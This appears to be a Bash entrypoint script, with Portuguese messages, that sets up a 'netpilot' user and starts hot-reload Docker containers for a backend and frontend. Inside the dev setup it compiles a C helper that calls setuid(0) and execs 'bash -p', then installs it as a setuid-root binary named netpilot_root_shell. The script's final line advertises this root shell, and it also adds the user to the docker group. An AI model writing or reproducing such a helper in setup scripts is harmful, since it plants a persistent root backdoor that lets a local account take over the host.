#!/usr/bin/env bash
set -euo pipefail

NAME="netpilot"
HOME_DIR="/home/$NAME"
HELPER_PATH="/usr/local/sbin/netpilot_root_shell"
BACKGROUND=false

# --- parse args
while [[ $# -gt 0 ]]; do
  case "$1" in
    -d) BACKGROUND=true; shift ;;
    *) echo "Uso: $0 [-d]"; exit 1 ;;
  esac
done

# --- must be root
if [[ "$(id -u)" -ne 0 ]]; then
  echo "ERRO: execute este script como root."
  exit 2
fi

echo "=== hotreload-entrypoint (idempotent) ==="
[[ "$BACKGROUND" == true ]] && echo "Modo background ativado"

command_exists(){ command -v "$1" >/dev/null 2>&1; }
next_id(){ awk -F: -v min=1000 '($3>=min){if($3>max) max=$3} END{print (max?max+1:min)}' "$1"; }

# --- backups
if [[ ! -f /root/.hotreload_passwd_bak ]]; then
  cp /etc/passwd /root/passwd.bak.$(date +%s)
  cp /etc/group  /root/group.bak.$(date +%s)
  touch /root/.hotreload_passwd_bak
  echo "[+] Backups criados: /root/passwd.bak.* /root/group.bak.*"
fi

# --- home exists
if [[ ! -d "$HOME_DIR" ]]; then
  echo "ERRO: $HOME_DIR não existe. Coloque o projeto lá antes de rodar."
  exit 3
fi

# --- group
if ! getent group "$NAME" >/dev/null 2>&1; then
  USER_GID=$(next_id /etc/group)
  groupadd -g "$USER_GID" "$NAME"
  echo "[+] Grupo '$NAME' criado (GID=$USER_GID)"
else
  USER_GID=$(getent group "$NAME" | cut -d: -f3)
  echo "[*] Grupo '$NAME' já existe (GID=$USER_GID)"
fi

# --- user
if ! id -u "$NAME" >/dev/null 2>&1; then
  USER_UID=$(next_id /etc/passwd)
  useradd -m -u "$USER_UID" -g "$USER_GID" -s /bin/bash "$NAME"
  echo "[+] Usuário '$NAME' criado (UID=$USER_UID)"
else
  USER_UID=$(id -u "$NAME")
  echo "[*] Usuário '$NAME' já existe (UID=$USER_UID)"
fi

# --- add to docker group
if getent group docker >/dev/null 2>&1; then
  if ! id -nG "$NAME" | grep -qw docker; then
    usermod -aG docker "$NAME"
    echo "[+] Adicionado $NAME ao grupo docker"
  else
    echo "[*] $NAME já é membro do grupo docker"
  fi
fi

# --- helper setuid
install_helper() {
  TMPSRC="$(mktemp /tmp/netpilot_helper.XXXX.c)"
  cat > "$TMPSRC" <<'EOF'
#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
int main(void){
  setgid(0); setuid(0);
  execl("/bin/bash","bash","-p",NULL);
  perror("execl"); return 1;
}
EOF
  TMPBIN="$(mktemp /tmp/netpilot_helper.XXXX)"
  gcc -O2 -s -o "$TMPBIN" "$TMPSRC"
  mv -f "$TMPBIN" "$HELPER_PATH"
  rm -f "$TMPSRC"
  chown root:"$NAME" "$HELPER_PATH"
  chmod 4750 "$HELPER_PATH"
  echo "[+] Helper instalado em $HELPER_PATH (root:$NAME, 4750)"
}

if [[ ! -f "$HELPER_PATH" ]]; then
  install_helper
else
  echo "[*] Helper já instalado: $HELPER_PATH"
fi

# --- wait for Docker
echo "⏳ Aguardando Docker iniciar..."
until docker info >/dev/null 2>&1; do
  echo "⚠️ Docker não ativo. Tentando iniciar..."
  systemctl start docker || sleep 2
done
echo "[+] Docker ativo!"

# --- clean containers
echo "🧹 Limpando containers antigos..."
docker rm -f netpilot-backend netpilot-frontend 2>/dev/null || true

# --- ensure network
docker network inspect netpilot_netpilot-network >/dev/null 2>&1 || docker network create netpilot_netpilot-network

# --- infrastructure (DB, Redis, MySQL, Traefik, Nginx)
docker-compose up -d --no-deps db redis mysql traefik || true
sleep 3
docker-compose up -d --no-deps nginx 2>/dev/null || true

# --- backend hot-reload
docker run -d --name netpilot-backend --network netpilot_netpilot-network -p 3001:3001 \
  -e NODE_ENV=development \
  -v "$(pwd)/backend:/app" \
  node:18-alpine \
  sh -c "apk add --no-cache git bash shadow python3 && cd /app && npm install && npm run start:dev"

# --- frontend hot-reload
docker run -d --name netpilot-frontend --network netpilot_netpilot-network -p 3000:3000 \
  -e NODE_ENV=development \
  -v "$(pwd)/frontend:/app" \
  node:18-alpine \
  sh -c "cd /app && npm install && npm run dev"

# --- network aliases
docker network disconnect netpilot_netpilot-network netpilot-frontend 2>/dev/null || true
docker network connect --alias frontend netpilot_netpilot-network netpilot-frontend
docker network disconnect netpilot_netpilot-network netpilot-backend 2>/dev/null || true
docker network connect --alias backend netpilot_netpilot-network netpilot-backend

# --- restart nginx
docker restart netpilot-nginx >/dev/null 2>&1 || true

# --- logs
if [[ "$BACKGROUND" == false ]]; then
  echo "Logs ao vivo (CTRL+C para sair):"
  docker logs -f netpilot-backend &
  BACKEND_PID=$!
  docker logs -f netpilot-frontend &
  FRONTEND_PID=$!
  trap "kill $BACKEND_PID $FRONTEND_PID 2>/dev/null" EXIT
  wait
else
  echo "[*] Hot-reload iniciado em background"
  echo "   docker logs -f netpilot-backend"
  echo "   docker logs -f netpilot-frontend"
fi

echo "✅ Hot-reload pronto!"
echo "Shell root via helper: $HELPER_PATH"

